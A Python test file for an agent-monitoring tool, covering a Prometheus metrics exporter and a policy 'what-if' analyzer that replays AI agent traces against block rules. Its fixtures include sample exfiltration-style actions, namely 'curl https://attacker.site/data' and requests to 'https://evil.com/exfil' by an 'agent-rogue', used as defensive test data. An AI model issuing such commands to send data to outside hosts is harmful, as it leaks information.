"""
Unit & Integration Tests for Sprint 4:
1. Prometheus Metrics Telemetry Exporter (/metrics, /api/v1/metrics)
2. MetricsCollector Accrual & Quantiles
3. Policy Impact "What-If" Replay Analyzer & Drift Estimator
"""

import json
from pathlib import Path
import tempfile

from fastapi.testclient import TestClient

from runtimeverify.api.app import app
from runtimeverify.api.v1.metrics import MetricsCollector
from runtimeverify.events.canonical import (
    NetworkRequestEvent,
    ShellCommandEvent,
)
from runtimeverify.policy.impact import PolicyImpactAnalyzer
from runtimeverify.policy.models import (
    Policy,
    PolicyDecisionType,
    PolicyMatchCriteria,
    PolicySeverity,
    ShellPattern,
)


class TestPrometheusMetrics:
    def test_metrics_collector_accrual(self):
        collector = MetricsCollector()
        collector.record_action("shell", "ALLOW", duration_seconds=0.012)
        collector.record_action("shell", "BLOCK", duration_seconds=0.005)
        collector.record_action("network", "ALLOW", duration_seconds=0.020)
        collector.record_decision("ALLOW")
        collector.record_decision("BLOCK")
        collector.record_violation("CRITICAL")
        collector.set_active_sessions(42)

        prom_text = collector.generate_prometheus_text()
        assert "rv_actions_evaluated_total" in prom_text
        assert 'rv_actions_evaluated_total{action_type="shell",status="ALLOW"} 1' in prom_text
        assert 'rv_actions_evaluated_total{action_type="shell",status="BLOCK"} 1' in prom_text
        assert 'rv_actions_evaluated_total{action_type="network",status="ALLOW"} 1' in prom_text
        assert 'rv_decisions_total{decision="ALLOW"} 1' in prom_text
        assert 'rv_decisions_total{decision="BLOCK"} 1' in prom_text
        assert 'rv_security_violations_total{severity="CRITICAL"} 1' in prom_text
        assert "rv_active_sessions_count 42" in prom_text
        assert "rv_decision_latency_seconds_count 3" in prom_text

    def test_metrics_http_endpoints(self):
        client = TestClient(app)

        # Test /api/v1/metrics
        res_v1 = client.get("/api/v1/metrics")
        assert res_v1.status_code == 200
        assert "text/plain" in res_v1.headers["content-type"]
        assert "rv_actions_evaluated_total" in res_v1.text

        # Test /metrics (root Prometheus scrape path)
        res_root = client.get("/metrics", headers={"Accept": "text/plain"})
        assert res_root.status_code == 200
        assert "rv_active_sessions_count" in res_root.text


class TestPolicyImpactAnalyzer:
    def test_impact_simulation_detects_delta_blocks(self):
        analyzer = PolicyImpactAnalyzer()

        # Candidate policy: block all curl commands to non-internal domains
        candidate = Policy(
            id="block-unauthorized-curl",
            decision=PolicyDecisionType.BLOCK,
            severity=PolicySeverity.HIGH,
            match=PolicyMatchCriteria(
                command=ShellPattern(command="curl*"),
            ),
            reason="Blocked unauthorized curl utility usage",
        )

        traces = [
            ShellCommandEvent(
                session_id="s1",
                agent_id="agent-worker-1",
                command="git status",
                target="git",
            ),
            ShellCommandEvent(
                session_id="s1",
                agent_id="agent-worker-1",
                command="curl https://attacker.site/data",
                target="curl",
            ),
            NetworkRequestEvent(
                session_id="s2",
                agent_id="agent-worker-2",
                url="https://api.github.com/repos",
                target="https://api.github.com/repos",
            ),
        ]

        report = analyzer.simulate(candidate, traces)
        assert report.total_events_evaluated == 3
        assert report.newly_blocked_count == 1
        assert "agent-worker-1" in report.affected_agents
        assert len(report.impacted_actions) == 1
        assert "curl" in report.impacted_actions[0].target
        assert report.delta_block_rate_pct > 0.0

    def test_impact_simulation_from_files(self):
        analyzer = PolicyImpactAnalyzer()

        # Create temporary policy YAML and traces JSON
        policy_yaml = """
id: block-exfil-destinations
decision: BLOCK
severity: CRITICAL
match:
  network:
    domains:
      - "evil.com"
reason: "Blocked known exfiltration target"
"""
        traces_json = [
            {
                "event_type": "network.request",
                "session_id": "s-100",
                "agent_id": "agent-rogue",
                "url": "https://evil.com/exfil",
                "target": "https://evil.com/exfil",
            },
            {
                "event_type": "network.request",
                "session_id": "s-100",
                "agent_id": "agent-safe",
                "url": "https://api.internal.corp/data",
                "target": "https://api.internal.corp/data",
            },
        ]

        with tempfile.TemporaryDirectory() as tmpdir:
            p_path = Path(tmpdir) / "policy.yaml"
            t_path = Path(tmpdir) / "traces.json"
            p_path.write_text(policy_yaml, encoding="utf-8")
            t_path.write_text(json.dumps(traces_json), encoding="utf-8")

            report = analyzer.simulate_from_files(str(p_path), str(t_path))
            assert report.total_events_evaluated == 2
            assert report.newly_blocked_count == 1
            assert "agent-rogue" in report.affected_agents
            assert report.delta_block_rate_pct == 50.0
